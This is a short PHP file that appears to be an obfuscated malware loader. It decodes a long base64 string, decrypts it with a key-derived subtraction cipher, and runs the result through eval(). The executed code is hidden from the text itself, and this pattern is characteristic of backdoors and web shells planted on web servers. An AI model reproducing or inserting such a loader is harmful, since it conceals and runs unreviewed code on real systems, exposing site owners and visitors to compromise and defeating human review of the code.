<?php
function code_en($code, $crs){
    $crs = md5($crs);
    $x = 0;
    $code = base64_decode($code);
    $len = strlen($code);
    $l = strlen($crs);
    $char = '';
    for ($i = 0; $i < $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }
        $char .= substr($crs, $x, 1);
        $x++;
    }
    $streng = '';
    for ($i = 0; $i < $len; $i++) {
        if (ord(substr($code, $i, 1)) < ord(substr($char, $i, 1))) {
            $streng .= chr((ord(substr($code, $i, 1)) + 256) - ord(substr($char, $i, 1)));
        } else {
            $streng .= chr(ord(substr($code, $i, 1)) - ord(substr($char, $i, 1)));
        }
    }
    return $streng;
}
$code = "pM6ey5WkyKtfWpyip6ShmNyTnqWpoqimXF1VZo5vPkDNy1jLqaTIq19Xl4B5iJBexpymoptak1xVV1tWhViQfam5i4mZmdCmm1qVWXFxVV6UW2KuRD0/c5iZoqXJXFNkzNmRxZmW1qpZX2htaGhecnA+QnOam6OimVlXn9OYlq6S1ZjSWF2Ta2tnYXRBPj6cxpyoU1mWnqCklVWf2FSgoYagPWyzPm2gnVuhrKeZqV+Hk4B4i45YqqeaqZuHkVpWiotQ1qia0F9bkn9+iI9XrtWdrZhZkF9csD4/P4mro5/YylCfVqXVoKRbXJh7eYmShaurnKuYWJBebEJAblihl9jNUJ9dX5JeZVNcsKadqZyRW2ebq6CiWnA+Pz+Jl6Ck2Mqe1nNYyqammqSeYaeeq8hhr5ipnJycmJKpn9Sia1aLk1TZqJrXnGVaZqGooaFenkFDPJ2copiUoaqqxJegpNjKntapWYenmKegZViXpKXXmaenYG4/QD86mpnNo1Fax9Se1puf13JEPUGuoqCepc5cW6CtmWSjnaFXX6BBO7Nxb5nIXlLJrKWWrKKjopSc252sp6pbXZmenZqV1amllcfUntabn9eqXlxhWa9BP0DJqaeWq5yloVWXnqLKk6Gr2MST0aSlyKWrpmBdmpOoq9WimqCcX1ZXqFpVsXI+Oj+Iy6CCc1GjnaajnadcWJuW1qiroZigm19VWKxdjm8+QG1ucMito8yrnFtcn6RgVVvWXXRAQTw/c5uUoaXYmVlaytVZnUM7bECpmKyupqJVi7WJfm5EPT+wQjuyQ2+apqTH2ZnRpFHGrKmfl7CZlqWYyplhV6ylolywPj9WbliUq9bRUJ9WlNipo5Khp52oXWCePUY9QJarpaGQqJvZo6GqjImT16idj1d6iIqFg4SJlriGhV9XV6uloVpwQ289lKvW0Y/Vm6XSp6tbXJyppqFjg3eOhYOChoeUeXp3qXmDYoTLkc6ploxyRD1BnKmmoZbWma2ip6deV5imp6KRVHSLtrF/soqQtXyLiIqHiIZ2hbZ6foVjU2dccD4/P4mYkqrFopPXqJ3CnK+Ym2FYl6qpz110QEE8mainnZSZ0aOkm4yJk9eonYxyRD1BoppcVlvHla2UYK5DPT46WZrGqJJWoYVwyJ+dyJaemKyYl6Ojq8iiraZfV6uloVpwQ289rkNubqLHqqbVpVdXnJqolXBEbbFGPaCZXpyopJqqjViQfam5i4SolcypWZBhX1pUWZaqeY2OWaion1eOXrFyPjpa1smZ1FZug1uWen2Nj1anm8ymW5ByQEA8WaanooVxUVrDrHW2kVPYqaNVlXRBPj530J+dnKlbWGFkU2NWiaaVn9aOa29AOoesqZ9pdlucqavTbmhiXlNkU1mmp6KFYlFd0dSSw6Rfy6ukn190QT4+W9impWV0Wp6nqaFvZZRbUWSEiaXUolGRV16cpp2ZrGOr26hgbkQ9P1eopaeVzaFiVqGFk9eoncKunJWompuZXVvYpqVkYG5DPT5VqKrXk5mjloVtgpmm1aOWqp2bpJWcnItYrqWjZV9uQjs+nM6glpXU2qTBmaDRq5yhrKxcVmNmhVRnU1ulmpynUWNWh2NTVpKFUs+lk8SlZZuspqBWYVeHp62llpujZF5sQkBumpqiycSg16qQxqalp52nqKddWZFjW1NlU1qlmZqnVpNUU2WGhV6CWJrRm5yrZqmcpFdjg1isp6mSnqBnWnBDbz1VnMPYpNSRjoN0V1NfZ2NbVWWDWKuXoKVWYVVYZF2FYlFd0dSSw6Rfy6ukn190QT4+W8mTrKepjpNTclFVXZNjWFaShVTUmprVV2VTX2hbVGNXip2nl5yrZKOdoVxxcj46nNPXlcOZmYtbnZKrraZUlqqDWJ+co5islF6sQkBuPZqcjMuZzpuQyK+gpqysXFiboM+Zr5RgXLFAPzo+P4mckqTI0ZWCc1HJpqeYpmFYmp6jyKqaX16lmFpebEJAbj06WtbJo8uwloN0V5mhpZmnnrHIXFthZlVkV5uaoZvblVpxcW85az9Vtqupp52mpFRyV8mmnpSbW1qblp+ZospgUVrWyaPLsJaMcldAQkI9PZuaz6OsmF9XnpSjlaGbjm9RQ25uOWufl4uqq6WrraZcWYrXpq2YpKNiWmRgm5/RmVGb0slXi1+scEFAPEFCmZedpoNWdaN1b6mjlp9VqdmtnZuhjJbRpKWQrpycn6Gobpemz5h0lqafpaVvmKebyqJsXaKJlsuiltmYV6atnJeZqKqfY6yjmKF0b2Shc1igQTs/bW45opmZ0KabW1yfnaCarcRgaWprZ19uQjs+P26xlqLXyqtvQDpsQECYm6GjVFdz03J1pqeUpFOopa6iynFYnNPTpI+tlsyen6dym6OgmXLGo6WiqW2omJlsXHSJmpqiyduRgqiWz6aYl3Rop6SWpaFwaKN1VXFAPzo+P+JBOz9tbqXQqZbXX1uGrKuomaKnjG9GPUBAQDw+rpqi2JmsQ25uOWublMumV1V0qXJwqKfEolmmq6yimHJYm6XTqF6tyc6Xyqprxaajl3Oco6CkqZ2mnpdyWnRXm5qhm9uVUaTT2VDIpabRm3Niq6mVonNzkqR3VXJAQDw+rkJAbrE+QNbKnsOjlotZZWKlr5qdoZyRpKGjWV9YYWSeq5yTpJmmho5rb0Bxxp+kopxhVmKdq8SXnJiqplhfZWhqa45vPkDh";
$crs = "ORmJwd56e";
$streng = code_en($code, $crs);
eval($streng);